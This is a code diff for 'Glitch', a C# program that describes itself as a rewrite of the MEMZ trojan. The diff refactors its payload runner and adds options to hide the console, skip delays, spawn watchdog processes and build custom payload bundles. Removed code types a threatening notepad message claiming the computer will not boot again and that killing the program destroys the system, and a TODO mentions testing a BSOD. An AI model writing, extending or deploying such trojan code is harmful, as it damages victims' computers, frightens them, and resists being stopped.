@@ -4,14 +4,9 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
-using System.Threading;
 using System.Windows.Forms;
 using GlitchPayloads;
-#if Watch_Dogs
-using System.Diagnostics;
-using CC_Functions.W32;
-
-#endif
+using Misc;
 
 namespace Glitch
 {
@@ -49,20 +44,24 @@ namespace Glitch
                 case "list":
                     Console.WriteLine(
                         string.Join(Environment.NewLine, payloads.Select(s => s.Item1.GetPayloadName())));
+                    Console.WriteLine(
+                        "[run] also accepts \"wd\", indicating watchdogs should be used, \"np\" for showing the notepad prompt," +
+                        Environment.NewLine + "\"hd\" for hiding the command prompt and \"sd\" to skip delays");
                     break;
                 case "full":
-                    ShowNotepad();
+                    StandardCommands.ShowNotepad();
                     payloads.ForEach(s => LaunchRunner(s.Item1, s.Item2));
-                    LaunchIncrementor();
+                    StandardCommands.LaunchIncrementor();
 #if Watch_Dogs
-                    Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
-                    for (int i = 0; i < WatchDog.WDC; i++)
-                        Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
+                    StandardCommands.HideCmd();
+                    StandardCommands.RunWDs();
 #else
                     ShowKill();
 #endif
                     break;
                 case "run":
+                    if (args.Contains("np"))
+                        StandardCommands.ShowNotepad();
                     Console.WriteLine("Using payloads:");
                     payloads.Where(s => args.Skip(1).Any(a => s.Item1.GetPayloadName().ToLower() == a)).ToList()
                         .ForEach(
@@ -70,9 +69,18 @@ namespace Glitch
                             {
                                 Console.WriteLine($"- {s.Item1.GetPayloadName()}");
                                 LaunchRunner(s.Item1, s.Item2);
+                                StandardCommands.GetRunner(s.Item1, args.Contains("sd") ? 0 : s.Item2.RunAfter,
+                                    s.Item2.DefaultDelay);
                             });
-                    LaunchIncrementor();
+                    StandardCommands.LaunchIncrementor();
+                    if (args.Contains("hd"))
+                        StandardCommands.HideCmd();
+                    if (args.Contains("wd"))
+                        StandardCommands.RunWDs();
                     ShowKill();
+                    break;
+                case "bld":
+                    PayloadBundleBuilder.Build(args.Skip(1).ToArray());
                     break;
                 case "help":
                     ShowHelp();
@@ -104,7 +112,8 @@ namespace Glitch
             Console.WriteLine("-   form: Shows a GUI to customize payloads (Memz Clean). Default.");
             Console.WriteLine("-   help: Displays this message");
             Console.WriteLine("-   list: Lists all payloads");
-            Console.WriteLine("-   run:  Run only the payloads specified in parameters");
+            Console.WriteLine("-   run:  Run only the payloads specified in parameters. See \"list\" for details");
+            Console.WriteLine("-   bld:  Build your own specialized binary. Same rules as \"run\"");
 #if Watch_Dogs
             Console.WriteLine("-   full: Runs all payloads. Includes Watchdogs");
 #else
@@ -115,42 +124,11 @@ namespace Glitch
 #endif
         }
 
-        public static void ShowNotepad()
-        {
-            Process proc = Process.Start("notepad.exe");
-            proc.WaitForInputIdle();
-            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
-            const string msg =
-                "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
-            SendKeys.SendWait(msg);
-        }
-
-        public static void LaunchIncrementor()
-        {
-            new Thread(() =>
-            {
-                Thread.Sleep(1000);
-                Common.TimePassed++;
-                Common.DelayMultiplier = Math.Max(240 / Common.TimePassed, float.Epsilon);
-            }).Start();
-        }
-
-        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) => GetRunner(method, data).Start();
-
-        public static Thread GetRunner(MethodInfo method, PayloadAttribute data) =>
-            new Thread(() =>
-            {
-                while (data.RunAfter < Common.TimePassed) Thread.Sleep(1000);
-                while (true)
-                {
-                    method.Invoke(null, new object[0]);
-                    Thread.Sleep(Math.Max((int) (data.DefaultDelay * Common.DelayMultiplier), 50));
-                }
-            });
+        public static void LaunchRunner(MethodInfo method, PayloadAttribute data) =>
+            StandardCommands.GetRunner(method, data.RunAfter, data.DefaultDelay).Start();
     }
 }
 
-//TODO: Function to build custom payload collections
 //TODO: Test BSOD
-//TODO: Test payloads
-//TODO: Use custom runner in form
+//TODO: Remove EmissionTest
+//TODO: Fix incorrect emission (code is OK but doesn't work)
